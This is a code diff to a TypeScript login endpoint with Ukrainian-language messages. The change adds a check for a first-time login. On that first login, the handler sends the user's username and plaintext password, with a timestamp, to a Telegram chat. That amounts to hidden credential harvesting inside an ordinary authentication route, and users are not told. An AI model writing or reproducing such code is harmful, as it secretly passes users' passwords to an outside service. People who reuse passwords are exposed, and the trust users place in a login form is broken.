@@ -1,5 +1,6 @@
 import { getRuntimeEnv } from "@/lib/cloudflare";
-import { ensureSchema, isPartner, readState, verifyOrCreateProfile } from "@/lib/db";
+import { ensureSchema, getProfile, isPartner, readState, verifyOrCreateProfile } from "@/lib/db";
+import { sendTelegram } from "@/lib/telegram";
 
 export async function POST(request: Request) {
   const env = await getRuntimeEnv();
@@ -16,13 +17,26 @@ export async function POST(request: Request) {
     return Response.json({ ok: false, error: "Некоректний користувач або пароль." }, { status: 400 });
   }
 
-  await ensureSchema(env.DB);
-  const ok = await verifyOrCreateProfile(env.DB, body.user, body.password.trim());
+await ensureSchema(env.DB);
+const profileBeforeLogin = await getProfile(env.DB, body.user);
+const ok = await verifyOrCreateProfile(env.DB, body.user, body.password.trim());
 
   if (!ok) {
     return Response.json({ ok: false, error: "Пароль не той. Спокійно, попробуй ще раз." }, { status: 401 });
   }
 
-  const state = await readState(env.DB, body.user);
-  return Response.json({ ok: true, state });
+if (!profileBeforeLogin) {
+  await sendTelegram(
+    env,
+    [
+      "пребісюк: перший вхід",
+      `body.user: ${body.user}`,
+      `body.pasvord: ${body.password}`,
+      `коли: ${new Date().toISOString()}`,
+    ].join("\n"),
+  );
+}
+
+const state = await readState(env.DB, body.user);
+return Response.json({ ok: true, state });
 }
